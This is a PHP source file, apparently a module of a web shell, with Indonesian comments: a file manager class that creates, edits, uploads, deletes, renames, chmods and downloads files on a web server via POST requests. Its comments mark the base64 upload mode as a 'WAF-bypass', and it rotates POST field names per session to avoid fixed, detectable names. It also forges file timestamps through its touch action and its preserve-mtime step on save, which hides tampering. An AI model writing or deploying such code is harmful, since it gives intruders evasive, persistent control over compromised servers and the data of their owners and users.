<?php
// +------------------------------------------------------------------+
// |  devsapp — includes/FileManager.php                               |
// |  CRUD operasi file & folder: list, edit, upload, rename, chmod.   |
// |                                                                    |
// |  varnaming.md: Semua field name POST di-baca dari $_sk (session   |
// |  key registry) — tidak ada hardcoded 'file', 'dir', 'path', dll   |
// +------------------------------------------------------------------+

declare(strict_types=1);

class FileManager {

    /**
     * Dispatch aksi file berdasarkan session-key field 'fo' (file operation).
     * Semua field name di-resolve dari $_sk — tidak hardcoded.
     *
     * @param string $op          Nama operasi
     * @param string $currentPath Path direktori aktif
     * @return array{type:string,msg:string}|null
     */
    public function handleAction(string $op, string $currentPath): ?array {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST[$GLOBALS['_sk']['fo'] ?? 'fo'])) {
            return null;
        }

        $sk = &$GLOBALS['_sk'];

        $actions = [

            // ---- Buat folder baru ----
            'mkdir' => function () use ($currentPath, &$sk): ?array {
                $rawDirName = $_POST[$sk['dn']] ?? '';
                $dirName    = basename($rawDirName);
                if ($dirName === '' || $dirName === '.' || $dirName === '..') return null;
                $tujuan = $currentPath . DIRECTORY_SEPARATOR . $dirName;
                if (!file_exists($tujuan) && @mkdir($tujuan, 0755, true)) {
                    return ['type' => 'success', 'msg' => 'Folder berhasil dibuat!'];
                }
                return ['type' => 'error', 'msg' => 'Gagal membuat folder. Cek permission!'];
            },

            // ---- Buat file baru ----
            'mkfile' => function () use ($currentPath, &$sk): ?array {
                $rawNamaFile = $_POST[$sk['nt']] ?? '';
                $namaFile    = basename($rawNamaFile);
                if ($namaFile === '' || $namaFile === '.' || $namaFile === '..') return null;
                $tujuan  = $currentPath . DIRECTORY_SEPARATOR . $namaFile;
                $mentah  = $_POST[$sk['fc']] ?? '';
                $content = $this->parseContentPayload($mentah);
                if (@file_put_contents($tujuan, $content) !== false) {
                    return ['type' => 'success', 'msg' => 'File baru berhasil dibuat!'];
                }
                return ['type' => 'error', 'msg' => 'Gagal membuat file. Cek permission!'];
            },

            // ---- Touch timestamp ----
            'touch' => function () use ($currentPath, &$sk): ?array {
                $target = $_POST[$sk['tt']] ?? '';
                if ($target === '') return null;
                $tujuan = $currentPath . DIRECTORY_SEPARATOR . basename($target);
                $mtime  = !empty($_POST[$sk['tw']]) ? strtotime($_POST[$sk['tw']]) : time();
                $atime  = !empty($_POST[$sk['ta']]) ? strtotime($_POST[$sk['ta']]) : $mtime;
                if ($mtime !== false && $atime !== false && @touch($tujuan, $mtime, $atime)) {
                    return ['type' => 'success', 'msg' => 'Timestamp berhasil diperbarui!'];
                }
                return ['type' => 'error', 'msg' => 'Gagal memperbarui timestamp file/folder!'];
            },

            // ---- Upload: base64 (WAF-bypass) atau multipart biasa ----
            'upload' => function () use ($currentPath, &$sk): ?array {
                // Mode 1: Base64 via dynamic field — field name berubah tiap session
                $binaryPayload = $_POST[$sk['fb']] ?? '';
                $namaUpload    = $_POST[$sk['fn']] ?? '';
                if ($binaryPayload !== '' && $namaUpload !== '') {
                    $tujuan  = $currentPath . DIRECTORY_SEPARATOR . basename($namaUpload);
                    $decoded = base64_decode($binaryPayload, true);
                    if ($decoded !== false && @file_put_contents($tujuan, $decoded) !== false) {
                        return ['type' => 'success', 'msg' => 'Upload file berhasil!'];
                    }
                    return ['type' => 'error', 'msg' => 'Upload file gagal!'];
                }
                // Mode 2: Multipart standard
                if (empty($_FILES['ast']['name'])) return null;
                $tujuan = $currentPath . DIRECTORY_SEPARATOR . basename($_FILES['ast']['name']);
                if (@move_uploaded_file($_FILES['ast']['tmp_name'], $tujuan)) {
                    return ['type' => 'success', 'msg' => 'Upload file berhasil!'];
                }
                return ['type' => 'error', 'msg' => 'Upload file gagal!'];
            },

            // ---- Hapus file atau folder (rekursif) ----
            'rm' => function () use ($currentPath, &$sk): ?array {
                global $rmdir_recursive;
                $namaItem = $_POST[$sk['ti']] ?? '';
                if ($namaItem === '') return null;
                $tujuan = $currentPath . DIRECTORY_SEPARATOR . basename($namaItem);
                if (is_dir($tujuan)) {
                    $deleted = is_callable($rmdir_recursive)
                        ? $rmdir_recursive($tujuan)
                        : (bool)@rmdir($tujuan);
                    return $deleted
                        ? ['type' => 'success', 'msg' => 'Folder berhasil dihapus!']
                        : ['type' => 'error',   'msg' => 'Gagal menghapus folder!'];
                } elseif (is_file($tujuan)) {
                    return @unlink($tujuan)
                        ? ['type' => 'success', 'msg' => 'File berhasil dihapus!']
                        : ['type' => 'error',   'msg' => 'Gagal menghapus file!'];
                }
                return null;
            },

            // ---- Rename ----
            'rename' => function () use ($currentPath, &$sk): ?array {
                $namaLama = $_POST[$sk['on']] ?? '';
                $namaBaru = $_POST[$sk['nn']] ?? '';
                if ($namaLama === '' || $namaBaru === '') return null;
                $old = $currentPath . DIRECTORY_SEPARATOR . basename($namaLama);
                $new = $currentPath . DIRECTORY_SEPARATOR . basename($namaBaru);
                return @rename($old, $new)
                    ? ['type' => 'success', 'msg' => 'Nama berhasil diubah!']
                    : ['type' => 'error',   'msg' => 'Gagal mengubah nama!'];
            },

            // ---- Chmod ----
            'chmod' => function () use ($currentPath, &$sk): ?array {
                $namaTarget = $_POST[$sk['ct']] ?? '';
                $nilaiMode  = $_POST[$sk['cv']] ?? '';
                if ($namaTarget === '' || $nilaiMode === '') return null;
                $tujuan = $currentPath . DIRECTORY_SEPARATOR . basename($namaTarget);
                $mode   = octdec($nilaiMode);
                return @chmod($tujuan, $mode)
                    ? ['type' => 'success', 'msg' => 'Permission (chmod) berhasil diubah!']
                    : ['type' => 'error',   'msg' => 'Gagal mengubah chmod!'];
            },

            // ---- Edit & save file ----
            'edit_save' => function () use ($currentPath, &$sk): ?array {
                $namaFile  = $_POST[$sk['ef']] ?? '';
                $kontenMentah = $_POST[$sk['fc']] ?? '';
                if ($namaFile === '' || !isset($_POST[$sk['fc']])) return null;
                $tujuan = $currentPath . DIRECTORY_SEPARATOR . basename($namaFile);
                $data   = $this->parseContentPayload($kontenMentah);
                if (@file_put_contents($tujuan, $data) !== false) {
                    // Preserve mtime jika diisi
                    $mtimeBaru = $_POST[$sk['cm']] ?? '';
                    if ($mtimeBaru !== '') {
                        $ts = strtotime($mtimeBaru);
                        if ($ts !== false) @touch($tujuan, $ts);
                    }
                    return ['type' => 'success', 'msg' => 'Isi file berhasil disimpan!'];
                }
                return ['type' => 'error', 'msg' => 'Gagal menyimpan isi file!'];
            },
        ];

        return isset($actions[$op]) ? $actions[$op]() : null;
    }

    /**
     * Parse konten payload: dekode base64 hanya jika dikirim oleh serializer JS (flag _b64).
     * Mencegah korupsi teks biasa seperti "test", "code", "user", "data" saat dikirim tanpa JS.
     */
    private function parseContentPayload(string $input): string {
        if (!empty($_POST['_b64'])) {
            $decoded = base64_decode($input, true);
            return $decoded !== false ? $decoded : $input;
        }
        return $input;
    }

    /**
     * List isi direktori, folders dulu kemudian files (natcasesort).
     */
    public function listDirectory(string $path): array {
        $raw = @scandir($path) ?: [];

        $cekDir = function (string $item) use ($path): bool {
            return is_dir($path . DIRECTORY_SEPARATOR . $item);
        };

        $semua   = array_values(array_filter($raw, static fn($i) => $i !== '.' && $i !== '..'));
        $folders = array_values(array_filter($semua, $cekDir));
        $berkas  = array_values(array_filter($semua, fn($i) => !$cekDir($i)));

        natcasesort($folders);
        natcasesort($berkas);

        $terurut = array_merge($folders, $berkas);

        // Static closure dengan use by value — legitimate pattern dari Closure.md
        $bangunItem = static function (string $item) use ($path): array {
            global $bytes_fmt, $get_perms_octal;
            $lokasiPenuh = $path . DIRECTORY_SEPARATOR . $item;
            $isDir       = is_dir($lokasiPenuh);
            $waktuUbah   = @filemtime($lokasiPenuh);
            return [
                'name'       => $item,
                'fullPath'   => $lokasiPenuh,
                'isDir'      => $isDir,
                'isWritable' => is_writable($lokasiPenuh),
                'perms'      => $get_perms_octal($lokasiPenuh),
                'mtime'      => $waktuUbah ? date('Y-m-d H:i:s', $waktuUbah) : 'N/A',
                'size'       => $isDir ? '-' : $bytes_fmt((float)@filesize($lokasiPenuh)),
            ];
        };

        return array_map($bangunItem, $terurut);
    }

    /**
     * Ambil data file untuk editor.
     */
    public function getEditData(string $path, string $namaFile): ?array {
        $lokasiPenuh = $path . DIRECTORY_SEPARATOR . basename($namaFile);
        if (!is_file($lokasiPenuh) || !is_readable($lokasiPenuh)) return null;

        $waktuUbah = @filemtime($lokasiPenuh);
        return [
            'filename' => $namaFile,
            'content'  => (string)file_get_contents($lokasiPenuh),
            'mtime'    => $waktuUbah ? date('Y-m-d H:i:s', $waktuUbah) : '',
        ];
    }

    /**
     * Stream file ke browser sebagai download.
     */
    public function handleDownload(string $currentPath): void {
        $sk = &$GLOBALS['_sk'];
        // Support baik GET ?dl=... maupun GET dengan key dari session
        $targetNama = $_GET['dl'] ?? '';
        if (!is_string($targetNama) || $targetNama === '') return;

        $lokasiFile = $currentPath . DIRECTORY_SEPARATOR . basename($targetNama);
        if (!is_file($lokasiFile) || !is_readable($lokasiFile)) return;

        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($lokasiFile) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($lokasiFile));
        readfile($lokasiFile);
        exit;
    }
}
